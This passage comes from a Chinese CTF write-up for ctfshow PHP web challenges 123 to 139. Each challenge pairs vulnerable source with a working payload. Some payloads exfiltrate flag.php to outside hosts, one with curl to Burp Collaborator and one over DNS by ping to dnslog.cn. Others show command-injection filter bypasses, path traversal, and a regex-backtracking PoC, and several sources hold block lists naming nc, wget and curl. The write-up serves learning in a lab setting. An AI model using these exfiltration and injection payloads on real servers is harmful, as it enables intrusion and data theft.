&quot;hacker!!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弱类型很好玩的一种奇怪的情况。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">num=%0c36</span><br></pre></td></tr></table></figure><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>读懂题意即可，需要注意的是在传参时传入一个非法的他会将第一个字符转换为_且值转换一次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo $flag</span><br></pre></td></tr></table></figure><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);</span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了好多函数</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1=flag.php</span><br><span class="line">[post data]</span><br><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=highlight_file($_GET[1])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=extract(&#x27;$_POST&#x27;)&amp;fl0g=flag_give_me</span><br></pre></td></tr></table></figure><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;, $c) &amp;&amp; strlen($c)&lt;=16)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个过滤的太难受了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?a=1+fl0g=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</span><br></pre></td></tr></table></figure><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//特殊字符检测</span><br><span class="line">function waf($url)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;, $url))&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(waf($url))&#123;</span><br><span class="line">    die(&quot;嗯哼？&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($ctf_show===&#x27;ilove36d&#x27;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>变量覆盖的题目，难点是_被过滤了，找一个非法的字符然后能够使其转换为_，发现空格可以。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf show=ilove36d</span><br></pre></td></tr></table></figure><h2 id="web128"><a href="#web128" class="headerlink" title="web128( _())"></a>web128( _())</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$f1 = $_GET[&#x27;f1&#x27;];</span><br><span class="line">$f2 = $_GET[&#x27;f2&#x27;];</span><br><span class="line"></span><br><span class="line">if(check($f1))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;嗯哼？&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check($str)&#123;</span><br><span class="line">    return !preg_match(&#x27;/[0-9]|[a-z]/i&#x27;, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来一点热知识</p><blockquote><p> _()是一个函数</p><p>_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</p><p>get_defined_vars()函数</p><p>get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag</p></blockquote><p>payload: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure><h2 id="web129-多重目录"><a href="#web129-多重目录" class="headerlink" title="web129(多重目录)"></a>web129(多重目录)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">=error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;f&#x27;]))&#123;</span><br><span class="line">    $f = $_GET[&#x27;f&#x27;];</span><br><span class="line">    if(stripos($f, &#x27;ctfshow&#x27;)&gt;0)&#123;</span><br><span class="line">        echo readfile($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造多重目录，返回一个不存在滴目录，然后慢慢构造</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctfshow/../../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../ctfshow/../html/flag.php</span><br></pre></td></tr></table></figure><h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2><blockquote><p>very very very（省略25万个very）ctfshow</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class="line">    $f = $_POST[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class="line">        die(&#x27;bye!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(stripos($f, &#x27;ctfshow&#x27;) === FALSE)&#123;</span><br><span class="line">        die(&#x27;bye!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个正则不知道想干啥</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=ctfshow</span><br></pre></td></tr></table></figure><h2 id="web131-正则溢出"><a href="#web131-正则溢出" class="headerlink" title="web131(正则溢出)"></a>web131(正则溢出)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class="line">    $f = (String)$_POST[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class="line">        die(&#x27;bye!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;</span><br><span class="line">        die(&#x27;bye!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正则溢出，涨知识了</p><p><a href="https://www.laruence.com/2010/06/08/1579.html">深悉正则(pcre)最大回溯/递归限制 - 风雪之隅 (laruence.com)</a></p><p>写一个很简单的poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">very=&#x27;very&#x27;*250000+&#x27;36Dctfshow&#x27;</span><br><span class="line">data=&#123;&#x27;f&#x27;:very&#125;</span><br><span class="line">url=&#x27;http://6dd31482-e895-424c-8c64-8a12edaefb5f.challenge.ctf.show/&#x27;</span><br><span class="line"></span><br><span class="line">pos=requests.post(url=url,data=data)</span><br><span class="line">print(pos.text)</span><br></pre></td></tr></table></figure><h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $username = (String)$_GET[&#x27;username&#x27;];</span><br><span class="line">    $password = (String)$_GET[&#x27;password&#x27;];</span><br><span class="line">    $code = (String)$_GET[&#x27;code&#x27;];</span><br><span class="line"></span><br><span class="line">    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;</span><br><span class="line">        </span><br><span class="line">        if($code == &#x27;admin&#x27;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>肯定要给源码试了<a href="http://www.zip/">www.zip</a>    试了.git，发现robots.txt有内容，访问/admin，发现源码</p><p>主要是逻辑第一个&amp;&amp;返回false，然后||返回一个true即可执行</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=admin&amp;password=admin&amp;code=admin</span><br></pre></td></tr></table></figure><h2 id="web133-Burp-Collaborator客户端-类似于DNSlog平台"><a href="#web133-Burp-Collaborator客户端-类似于DNSlog平台" class="headerlink" title="web133(Burp Collaborator客户端(类似于DNSlog平台))"></a>web133(Burp Collaborator客户端(类似于DNSlog平台))</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag.php</span><br><span class="line">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class="line">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;</span><br><span class="line">        eval(substr($F,0,6));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;6个字母都还不够呀?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>六个数直接无了，思考了好久没啥思路，主要是没回显，很难受，知道用dnslog，但奈何太菜，并没有怎么用过，看了hint</p><p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382">https://blog.csdn.net/qq_46091464/article/details/109095382</a></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F=`$F`;+curl -X POST -F xx=@flag.php  http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/aa518e820b954dd59b7ef708fab1464f.png" alt="img" style="zoom:67%;" /><p>学习了bp的新模块，学到了</p><h2 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$key1 = 0;</span><br><span class="line">$key2 = 0;</span><br><span class="line">if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;</span><br><span class="line">    die(&quot;nonononono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">extract($_POST);</span><br><span class="line">if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;</span><br><span class="line">    die(file_get_contents(&#x27;flag.php&#x27;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这几个题还是推荐在本地复现，容易发现一些奇奇怪怪的问题</p><p>此题难点在于不能通过正常的get和post方法传参，但是parse_str($_SERVER[‘QUERY_STRING’]);</p><p>给了机会，强行将_post看作一个参数</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure><h2 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//flag.php</span><br><span class="line">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class="line">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;</span><br><span class="line">        eval(substr($F,0,6));</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我超过滤这么多！！！ curl别过滤了，但是ping可以用</p><p>还有一个坑，在ping之后发现没有回显，最后做了筛选才成功拿到</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F=`$F`;+ping `nl flag.php|awk &#x27;NR==16&#x27;| tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.wau0cy.dnslog.cn</span><br></pre></td></tr></table></figure><h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function check($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>没有回显所以对输出内容转存</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /|tee 1</span><br></pre></td></tr></table></figure><h2 id="web137-call-user-fuc"><a href="#web137-call-user-fuc" class="headerlink" title="web137(call_user_fuc)"></a>web137(call_user_fuc)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br></pre></td></tr></table></figure><p>考察call_user_fuc的利用</p><p><a href="https://www.php.net/manual/zh/function.call-user-func.php">https://www.php.net/manual/zh/function.call-user-func.php</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[post data]</span><br><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;</span><br><span class="line">    die(&quot;private function&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure><h2 id="web139-命令盲注"><a href="#web139-命令盲注" class="headerlink" title="web139(命令盲注)"></a>web139(命令盲注)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function check($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    check($c);</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>类似于sql的时间盲注，写一句shell语句</p><p>exp：注出目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 